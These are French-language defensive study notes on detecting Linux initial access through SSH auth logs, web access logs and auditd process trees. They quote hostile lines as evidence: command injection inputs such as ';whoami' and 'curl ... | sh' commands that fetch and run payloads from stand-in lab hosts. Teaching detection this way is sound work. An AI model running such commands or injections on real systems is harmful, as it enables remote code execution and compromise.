## Initial Access via SSH

### Popularity of SSH

SSH = vecteur d'accès initial majeur sur Linux. ~40M machines exposées sur Internet (Shodan, 2025). MITRE : T1133 (External Remote Services).

![[shodan_report.png]]

### Initial Access via SSH

Deux méthodes principales d'accès :

**Key-based**

- Vol de clé privée via repo GitHub/serveur Ansible
- Stealer sur le poste d'un admin

**Password-based**

- Mot de passe faible laissé par erreur
- Accès contracteur avec password trivial
- Vieux serveur SSH réexposé accidentellement

Exemple réel : groupe **Outlaw** -> brute-force SSH à grande échelle via botnet.

Vecteurs avancés (hors scope) : CVE Erlang/OTP, SSH session hijacking (T1563.001).

---

## Detecting SSH Attacks

### SSH Breach Example

Scénario type : SSH public + password auth + mot de passe faible = compromission inévitable.

![[detecting_ssh_attacks.png]]

### Detecting SSH Attacks

Point de départ : lister tous les logins SSH réussis.

bash

```bash
cat /var/log/auth.log | grep -E 'Accepted'
```

Exemple de sortie :

```
2025-08-19T14:00:02  Accepted publickey for ansible from 10.14.105.255
2025-08-20T12:56:49  Accepted password for jsmith from 54.155.224.201
2025-08-22T03:14:06  Accepted password for jsmith from 196.251.118.184
```

**Analyse :**

| Login                                       | Signaux                                        | Verdict                  |
| ------------------------------------------- | ---------------------------------------------- | ------------------------ |
| ansible / clé publique / IP interne / 14h00 | Auth par clé, IP privée, heure régulière       | Probablement légitime    |
| jsmith / password / IP externe / x2         | Password auth, IPs externes, horaires suspects | Suspect -> à investiguer |

**Red flags jsmith :** password auth + IPs externes + écart horaire (connexion de nuit probable).

**Checklist d'investigation :**

- Username → propriétaire, heure/IP attendues ?
- Source IP → TI lookup (malicious ?)
- Login history → précédé de brute-force ?
- Post-login → analyser les actions suivantes

---

## Initial Access via Services

### Linux and Public Services

Services publics exposés = surface d'attaque majeure. MITRE : T1190 (Exploit Public-Facing Application).

Exemples réels :

- [CVE in Zimbra Collaboration(opens in new tab)](https://thehackernews.com/2024/10/researchers-sound-alarm-on-active.html): Allowed the attackers to execute arbitrary OS commands
- [Exposed Docker API port(opens in new tab)](https://www.aquasec.com/blog/threat-alert-teamtnts-docker-gatling-gun-campaign/#:~:text=The%20campaign%20gains%20initial%20access%20by%20exploiting%20exposed%20Docker%20daemons): Acted as an entry point in a series of cloud infrastructure breaches
- [CVE in Palo Alto firewalls(opens in new tab)](https://unit42.paloaltonetworks.com/cve-2024-3400/): Granted attackers full control over the Linux-based firewall's OS
- [WordPress "plugins" feature(opens in new tab)](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/): Often abused to upload malware like web shells to the system

### Using Application Logs

Les logs applicatifs ne disent pas "je suis exploité", mais ils fournissent des artefacts utiles :

- Web logs → détection d'attaques web
- DB logs → requêtes SQL suspectes
- VPN logs → connexions anormales

### Web as Initial Access

Exemple : app `TryPingMe` exécute `ping -c 2 [INPUT]` sans filtrage → command injection.

bash

```bash
cat /var/log/nginx/access.log
```

```
10.14.105.255  "GET /ping?host=hello"    500
10.14.105.255  "GET /ping?host=whoami"   500
10.14.105.255  "GET /ping?host=;whoami"  200  ← injection réussie
10.14.105.255  "GET /ping?host=;ls"      200  ← exécution OS confirmée
```

### Web Logs Analysis

Pattern d'exploitation visible :

1. Tâtonnements → codes 500 (input invalide)
2. Injection avec `;` → code 200 = exécution réussie

Conclusions depuis les logs seuls :

- `10.14.105.255` = IP attaquant
- `/ping` vulnérable à la command injection
- Commandes `whoami` et `ls` exécutées sur le système

---

## Detecting Service Breach

### Building Process Tree

Quand les logs applicatifs sont absents ou insuffisants → **process tree analysis**.

Scénario type : alerte sur commande suspecte (ex: `whoami`) → remonter l'arbre de processus pour identifier le processus parent.

![[process_tree.png]]

### Auditd and Process Tree

**Outil : `ausearch`**

|Option|Usage|
|---|---|
|`-i -x <cmd>`|Trouver un processus par nom de commande|
|`--pid <PID>`|Trouver un processus par PID|
|`--ppid <PID>`|Lister tous les enfants d'un processus|

**Champs clés dans la sortie :**

- `pid` → PID du processus
- `ppid` → PID du parent
- `proctitle` → commande complète exécutée
- `exe` → binaire réel utilisé

**Remontée de l'arbre :**

bash

```bash
ausearch -i -x whoami
# → pid=3907, ppid=3905, exe=/usr/bin/whoami

ausearch -i --pid 3905
# → /bin/sh -c whoami, ppid=3898

ausearch -i --pid 3898
# → /usr/bin/python3 /opt/mywebapp/app.py, ppid=1
```

Résultat : `whoami` lancé par `app.py` → webapp potentiellement compromise.

**Lister tous les enfants de l'app :**

bash

```bash
ausearch -i --ppid 3898 | grep 'proctitle'
# → /bin/sh -c whoami
# → /bin/sh -c ls -la
# → /bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh  ← compromission confirmée
```

`curl ... | sh` = preuve de compromission (téléchargement et exécution de payload).

---

## Advanced Initial Access

### Human-Led Attacks

Linux = cible moins facile au phishing/USB (OS serveur, utilisateurs techniques) -> mais le risque existe :

| Scénario                                                              | Risque                               |
| --------------------------------------------------------------------- | ------------------------------------ |
| `curl https://shadyforum.thm/fix.sh \| bash` sans vérifier le contenu | Exécution de malware                 |
| `pip3 install fastpi` (typo sur `fastapi`)                            | Typosquatting -> package malveillant |

### Supply Chain Compromise

Attaque sur un logiciel en amont → tous ses utilisateurs infectés via mise à jour.

Exemples réels :

- A [backdoor in the XZ Utils(opens in new tab)](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) library that is a part of SSH nearly led to a breach of millions of Linux servers
- A [breach of the tj-actions(opens in new tab)](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) resulted in a leak of thousands of secrets, like SSH keys and access tokens

### Detecting the Attacks

Méthode universelle : **process tree analysis** à partir d'un trigger (alerte SIEM, connexion IP malveillante).

|Parent process|Commande suspecte|Indication|
|---|---|---|
|PHP|`whoami`|Web attack|
|Service interne|`wget`|Supply chain compromise|
|Session SSH user|XMRig (miner)|SSH breach|

![[detecting_supplychain_attack.png]]

---

## Linux Threat Detection 1 — Résumé

### Vecteurs d'Initial Access sur Linux

|Technique|MITRE|Exemples|
|---|---|---|
|SSH exposé|T1133|Brute-force, vol de clé privée|
|Service public vulnérable|T1190|CVE, command injection, webshell|
|Action humaine|—|curl pipe bash, typosquatting pip|
|Supply chain|—|XZ Utils backdoor, tj-actions|

### Détection SSH

bash

```bash
cat /var/log/auth.log | grep 'Accepted'
```

Red flags : password auth + IP externe + horaire anormal + brute-force précédant le login.

### Détection Service

- Logs applicatifs (nginx, etc.) → patterns d'exploitation (tâtonnements 500 → injection réussie 200)
- Process tree → remonter jusqu'au service parent compromis

### Détection par Process Tree (universel)

bash

```bash
ausearch -i -x <cmd>          # localiser la commande
ausearch -i --pid <ppid>      # remonter au parent
ausearch -i --ppid <pid> | grep proctitle  # lister tous les enfants
```

Remonter jusqu'à PID 1 pour identifier l'origine (webapp, SSH session, service interne).

### Signatures rapides

|Parent|Commande|=|
|---|---|---|
|PHP / Python app|`whoami`, `curl \| sh`|Web/service breach|
|Service interne|`wget` vers IP externe|Supply chain|
|Session SSH user|miner (XMRig)|SSH breach|

### Règle d'or

**Tout Initial Access laisse une trace dans l'arbre de processus.** Trigger (alerte) → process tree → origine → légitime ou malveillant.

